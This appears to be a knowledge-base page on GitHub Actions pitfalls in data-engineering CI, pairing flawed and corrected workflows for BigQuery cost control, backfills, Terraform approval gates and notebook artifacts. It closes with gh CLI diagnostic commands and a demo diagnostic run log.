**What happens:** A CI workflow runs a full dbt build or a BigQuery validation query on every push to any branch. The query scans 500 GB per run. With 10 engineers pushing 5 times each per day, that is 25 TB scanned daily — approximately $125/day in BigQuery on-demand pricing. The cost accumulates silently until the monthly bill arrives.

**Why it happens:** Workflows added for data validation do not include `paths:` filters or cost controls. Engineers copy CI patterns from application repos where query costs do not apply.

> [!warning] No cost controls on data validation CI
>
> ```yaml
> on:
>   push:           # runs on every push, every branch
>   pull_request:   # runs on every PR including documentation-only changes
>
> jobs:
>   bq-validate:
>     steps:
>       - run: bq query --use_legacy_sql=false < full_pipeline_validation.sql
>         # Scans 500 GB — $2.50 per run at $5/TB
> ```

> [!success] Path filters, dry-run mode, and cost guards
>
> ```yaml
> on:
>   pull_request:
>     paths:
>       - 'models/**'
>       - 'dbt_project.yml'
>       - 'queries/**'
>
> concurrency:
>   group: bq-ci-${{ github.ref }}
>   cancel-in-progress: true
>
> jobs:
>   bq-validate:
>     steps:
>       - run: bq query --use_legacy_sql=false --dry_run < validation.sql
>         # dry_run: validates syntax and estimates bytes, costs nothing
>       - name: Abort if scan estimate > 10 GB
>         run: |
>           BYTES=$(bq query --use_legacy_sql=false --dry_run --format=json < validation.sql \
>             | jq '.statistics.query.estimatedBytesProcessed // 0')
>           if [ "$BYTES" -gt "10737418240" ]; then
>             echo "::error::Query would scan $(( BYTES / 1073741824 )) GB — exceeds 10 GB limit"
>             exit 1
>           fi
> ```

**Prevention protocol:**

1. Use `--dry_run` for syntax validation in PR CI — costs nothing and catches most errors
2. Add `paths:` filters to limit CI runs to changes in relevant files
3. Use `concurrency: cancel-in-progress: true` to prevent multiple simultaneous validation runs
4. Run full scans only on merge to main, not on every PR push
5. Set BigQuery cost controls: `maximum_bytes_billed` in query config

### data engineering | backfill triggered with wrong date range

**What happens:** An engineer manually triggers a backfill workflow via `workflow_dispatch`. The date range input defaults to today's date. In a hurry, the engineer triggers without reviewing the inputs. The backfill overwrites 3 months of clean production data with reprocessed values, some of which contain a known data quality issue in the source for that period.

**Why it happens:** `workflow_dispatch` inputs with defaults are convenient but dangerous — the defaults may not be safe for re-execution. There is no confirmation step before the workflow runs.

> [!danger] Backfill workflow with dangerous defaults
>
> ```yaml
> on:
>   workflow_dispatch:
>     inputs:
>       start_date:
>         default: '2020-01-01'    # DANGEROUS: default covers years of data
>       end_date:
>         default: '2026-12-31'
>       target_table:
>         default: 'stoxx_bronze.signals_daily'  # production table
> ```

> [!success] Require explicit date range, no dangerous defaults, confirmation step
>
> ```yaml
> on:
>   workflow_dispatch:
>     inputs:
>       start_date:
>         description: "Start date (YYYY-MM-DD) — required, no default"
>         required: true
>       end_date:
>         description: "End date (YYYY-MM-DD) — required, no default"
>         required: true
>       target_schema:
>         description: "Schema to write to"
>         type: choice
>         options: [dev_reprocess, staging_reprocess]   # never production by default
>         default: dev_reprocess
>       confirm:
>         description: "Type CONFIRM to proceed"
>         required: true
>
> jobs:
>   backfill:
>     steps:
>       - name: Validate confirmation
>         run: |
>           if [ "$CONFIRM" != "CONFIRM" ]; then
>             echo "::error::You must type CONFIRM in the confirm input to proceed."
>             exit 1
>           fi
>         env:
>           CONFIRM: ${{ github.event.inputs.confirm }}
> ```

### data engineering | Terraform apply without approval gate

**What happens:** A Terraform workflow automatically applies infrastructure changes on merge to main, without an approval gate. A developer merges a PR that inadvertently deletes a BigQuery dataset (a `terraform destroy` for a resource that was renamed). The apply runs before anyone notices. The dataset — including 6 months of trading signals — is deleted.

**Why it happens:** Terraform plan/apply pipelines are copied from application CI examples that do not have destructive consequences. The difference in blast radius between a broken application deploy (which can be rolled back) and a destroyed dataset (which may not be recoverable) is not reflected in the workflow design.

> [!danger] Auto-apply Terraform on merge without approval
>
> ```yaml
> on:
>   push:
>     branches: [main]
>     paths: ['infra/**']
>
> jobs:
>   apply:
>     steps:
>       - run: terraform apply -auto-approve   # applies with no human review
> ```

> [!success] Separate plan and apply, require environment approval for apply
>
> ```yaml
> jobs:
>   plan:
>     runs-on: ubuntu-latest
>     outputs:
>       plan-exit-code: ${{ steps.plan.outputs.exit-code }}
>     steps:
>       - run: terraform plan -out=tfplan
>       - uses: actions/upload-artifact@v4
>         with:
>           name: tfplan
>           path: tfplan
>
>   apply:
>     needs: plan
>     environment: terraform-production   # requires manual approval from @platform-team
>     if: needs.plan.outputs.plan-exit-code == '2'   # only if plan has changes
>     steps:
>       - uses: actions/download-artifact@v4
>         with: { name: tfplan }
>       - run: terraform apply tfplan    # applies the reviewed plan only
> ```

### data engineering | dbt CI writing to shared schema

**What happens:** A dbt CI workflow creates test models in the shared `stoxx_staging` schema. Two engineers' PRs run CI simultaneously, each creating models with the same names. One run overwrites the other's test models mid-execution. Both CI runs fail with unexplained schema errors, and neither engineer can reproduce the failure locally.

**Prevention protocol:**

1. Configure dbt CI to use PR-scoped ephemeral schemas: `schema: pr_{{ env_var('PR_NUMBER') }}_staging`
2. Add a cleanup job that runs `if: always()` to drop the PR schema after CI completes
3. Use `concurrency: cancel-in-progress: true` on dbt CI to prevent simultaneous PR runs

### data engineering | notebook and report data leakage into artifacts

**What happens:** A CI workflow validates Jupyter notebooks by executing them and uploading the output as artifacts. One notebook queries a financial data table and renders the full result in its output cells. The artifact is stored for 90 days and is visible to all repo contributors — including contractors with read access but no database access.

**Prevention protocol:**

1. Never upload executed notebooks with output cells as public artifacts — always clear output before upload: `jupyter nbconvert --clear-output --inplace *.ipynb`
2. For notebooks that query financial data: execute them in CI without uploading output; use exit code checks only
3. Set artifact retention to the minimum needed (7–14 days for CI outputs)
4. Add `.nbstripout` as a pre-commit hook to prevent output cells from entering the repo

### data engineering | pipeline deploy race condition

**What happens:** A migration workflow and a deploy workflow are triggered simultaneously by the same merge to main. The deploy runs first with the old application code, then the migration runs and changes the schema. For 15 seconds, the new schema is live with the old application — which does not handle the new column structure, causing runtime errors in production.

**Prevention protocol:**

1. Use a single ordered workflow (migration → smoke test → deploy) rather than separate workflows triggered by the same event
2. Configure `concurrency:` with `cancel-in-progress: false` to serialize deploy sequences
3. Design migrations to be backward-compatible (additive changes only, no column removals in the same deploy as code that drops the column reference)

## A systematic path for diagnosing workflow failures

Effective incident response depends on knowing exactly which tools to reach for, in which order, when a workflow fails. This section covers the systematic methodology for diagnosing GitHub Actions failures.

### diagnostics | systematic failure investigation

**What happens (when things break):** A workflow fails and the immediate cause is not obvious from the job summary. The following methodology isolates the failure systematically using available GitHub tooling.

The following workflow was committed and triggered via `workflow_dispatch` (run 24314563376, 5s), demonstrating event payload inspection, runner environment capture, structured annotations, and re-run semantic reporting.

*Diagnostic workflow demonstrating event payload inspection, runner environment capture, and structured annotations.*

```yaml
name: "Demo: Problems | Operational Diagnostics"

on:
  workflow_dispatch:
    inputs:
      simulate_failure:
        description: "Simulate a step failure to test diagnostics"
        type: boolean
        default: false

jobs:
  diagnostics-demo:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2

      - name: Inspect event payload
        run: |
          echo "::group::Event payload (github context subset)"
          echo "event_name:    $GITHUB_EVENT_NAME"
          echo "ref:           $GITHUB_REF"
          echo "sha:           $GITHUB_SHA"
          echo "actor:         $GITHUB_ACTOR"
          echo "run_id:        $GITHUB_RUN_ID"
          echo "run_attempt:   $GITHUB_RUN_ATTEMPT"
          echo "::endgroup::"

      - name: Inspect runner environment
        run: |
          echo "::group::Runner environment"
          lsb_release -a
          echo "Kernel: $(uname -r)"
          echo "Python: $(python3 --version)"
          echo "Node:   $(node --version)"
          echo "::endgroup::"

      - name: Produce a structured annotation
        run: |
          echo "::notice file=.github/workflows/demo-problems-diagnostics.yml,line=1::Diagnostic workflow running"
          echo "::warning::Re-run semantics differ from a fresh run: GITHUB_RUN_ATTEMPT=$GITHUB_RUN_ATTEMPT"

      - name: Write diagnostic job summary
        if: always()
        run: |
          echo "## Diagnostic Run Summary" >> $GITHUB_STEP_SUMMARY
          echo "| Field | Value |" >> $GITHUB_STEP_SUMMARY
          echo "|---|---|" >> $GITHUB_STEP_SUMMARY
          echo "| Event | \`$GITHUB_EVENT_NAME\` |" >> $GITHUB_STEP_SUMMARY
          echo "| SHA | \`$GITHUB_SHA\` |" >> $GITHUB_STEP_SUMMARY
          echo "| Run ID | \`$GITHUB_RUN_ID\` |" >> $GITHUB_STEP_SUMMARY
          echo "| Run attempt | \`$GITHUB_RUN_ATTEMPT\` |" >> $GITHUB_STEP_SUMMARY
```

*Workflow run output (run 24314563376, workflow_dispatch, simulate_failure=false):*

```text
# captured from: gh run view 24314563376 --log
✓ diagnostics-demo in 5s (ID 70989923861)

ANNOTATIONS
  ! Re-run semantics differ from a fresh run: GITHUB_RUN_ATTEMPT=1
  - Diagnostic workflow running — this is informational

GITHUB_TOKEN Permissions:
  Contents: read
  Metadata: read

Event payload:
  event_name:    workflow_dispatch
  ref:           refs/heads/main
  ref_name:      main
  sha:           d030c26efc3a166909b0ac321fb04aefc96d9817
  actor:         alp78
  workflow:      Demo: Problems | Operational Diagnostics
  run_id:        24314563376
  run_number:    1
  run_attempt:   1
  repository:    alp78/git-lab

Runner environment:
  Runner OS:    Linux
  Runner arch:  X64
  Runner name:  GitHub Actions 1000000700
  Description:  Ubuntu 24.04.4 LTS
  Kernel:       6.17.0-1010-azure
  Docker:       Docker version 28.0.4, build b8034c0
  Python:       Python 3.12.3
  Node:         v20.20.2
```

### diagnostics | gh CLI diagnostic commands

Immediately when a workflow fails in CI and the job summary does not provide sufficient detail. It is typically triggered by A required check fails; a deployment goes missing; a workflow appears to hang or never start. Local shell with `gh` authenticated (`gh auth status`), read access to the repository. Extract structured failure information without opening the GitHub web UI.

*View the summary of a specific run.*

```bash
gh run view <run_id>
```

*Show the full log of a specific run.*

```bash
gh run view <run_id> --log
```

*Show only the failed step logs (most useful for large workflows).*

```bash
gh run view <run_id> --log-failed
```

*List recent runs for a specific workflow.*

```bash
gh run list --workflow=<filename>.yml --limit=10
```

*Download the raw log for grep-based analysis.*

```bash
gh run view <run_id> --log > run.log && grep -n "ERROR\|FAIL\|fatal\|::error::" run.log
```

*Show the event payload that triggered the run.*

```bash
gh api /repos/{owner}/{repo}/actions/runs/<run_id>
```

*List and inspect annotations produced by a run.*

```bash
gh api /repos/{owner}/{repo}/check-runs?head_sha=<sha> | jq '.check_runs[].output'
```

| `gh run` subcommand | Use case |
|---|---|
| `view <id>` | Job summary, annotations, conclusion |
| `view <id> --log` | Full raw log output |
| `view <id> --log-failed` | Failed step logs only |
| `view <id> --job=<job_id>` | Single job log |
| `list --workflow=<file>` | Recent runs for a workflow |
| `watch <id>` | Wait for a running workflow to complete |
| `rerun <id>` | Re-run all failed jobs |
| `rerun <id> --failed-only` | Re-run only failed jobs |
| `cancel <id>` | Cancel a running workflow |
| `download <id>` | Download all artifacts from a run |

### diagnostics | re-run semantics and their implications

Review re-run semantics before restarting a failed workflow, especially for production deploys or data-processing pipelines. This applies to any re-run operation. The goal is to understand exactly what GitHub preserves, rebuilds, and reuses so a re-run is not mistaken for a fresh trigger.

Re-run semantics differ significantly from a fresh workflow trigger:

| Property | Fresh trigger | Re-run (all jobs) | Re-run (failed only) |
|---|---|---|---|
| SHA / ref used | Current HEAD | Original run's SHA | Original run's SHA |
| Secrets | Current secrets | Current secrets at re-run time | Current secrets at re-run time |
| Artifacts | None (re-generated) | None (re-generated) | Pre-existing from original run |
| Environment variables | Current values | Current values | Current values |
| Cache | Current state | Current state | Current state |
| `GITHUB_RUN_ATTEMPT` | 1 | 2, 3, … | 2, 3, … |

> [!warning] Re-running failed jobs uses pre-existing artifacts from the original run
>
> If the `build` job passed on the original run and the `deploy` job failed, re-running only `deploy` uses the artifact produced by the original `build` — not a fresh build. If the original artifact is stale or corrupted, re-running only the deploy job will redeploy the same bad artifact.

> [!success] Re-run from the start when artifact freshness is uncertain
>
> Use `gh run rerun <id>` (all jobs) rather than `gh run rerun <id> --failed-only` when: the code may have changed since the original run, the failure could be artifact-related, or the workflow is a data processing pipeline where idempotency is not guaranteed.

### diagnostics | runner image and tool version drift

Investigate runner image drift when CI starts failing despite no code changes or when `ubuntu-latest` behavior shifts unexpectedly. The goal is to determine whether the breakage is environmental rather than application-related.

*Diagnose runner image version within a workflow.*

```yaml
- name: Show runner environment
  run: |
    echo "Runner image version:"
    cat /etc/os-release
    echo "Image release: $ImageVersion"      # set by GitHub-hosted runners
    echo "Python: $(python3 --version)"
    echo "Node: $(node --version)"
    echo "Docker: $(docker --version)"
```

*Check the runner images changelog for recent updates.*

```bash
gh api /repos/actions/runner-images/releases --limit=5 | jq '.[].tag_name'
```

**Prevention protocol:**

1. Pin all `runs-on:` values to specific versions: `ubuntu-22.04` not `ubuntu-latest`
2. Subscribe to runner image release notifications via the `actions/runner-images` repo on GitHub
3. When upgrading runner versions, do it in a dedicated PR and require the full test suite to pass before merging to the default branch
4. Audit runner version references: `grep -rn "runs-on:.*latest" .github/workflows/`

## Related notes and supporting topics

**GCP (Chapter 06):**

- [secrets-management](https://alp78.github.io/elysium/06-GCP/Security/secrets-management) — secret rotation and GCP Secret Manager
- [service-accounts-and-iam](https://alp78.github.io/elysium/06-GCP/Security/service-accounts-and-iam) — Workload Identity Federation (keyless auth)

## Reference links and further reading

- **GitHub Actions Is Slowly Killing Your Engineering Team** — iankduncan.com. Covers feedback loop costs, YAML testability gaps, and the human cost of long CI cycles.
- **Lessons Learned from Enterprise Usage of GitHub Actions** — InfoQ. Enterprise adoption patterns, reusable workflow limitations, and permission model confusion at scale.
- **Top 10 GitHub Actions Security Pitfalls** — Arctiq. Security-focused analysis of `pull_request_target`, injection, and permission misconfigurations.
- **GitHub Actions supply chain attack** — TechTarget. Coverage of the real-world worm affecting 20,000+ repositories via compromised Actions workflows.
- **GitHub Actions Pricing Whiplash** — Socket.dev. Analysis of cost surprise patterns, minute consumption, and the impact of the 2025 pricing changes on open-source and enterprise teams.
- **actionlint** — https://github.com/rhysd/actionlint. Static analysis tool for GitHub Actions workflow files.
- **zizmor** — https://github.com/woodruffw/zizmor. Security-focused static analysis with `pull_request_target` and `workflow_run` trust boundary detection.
- **SLSA Supply Chain Framework** — https://slsa.dev. Levels 1–4 for build provenance and supply-chain integrity.
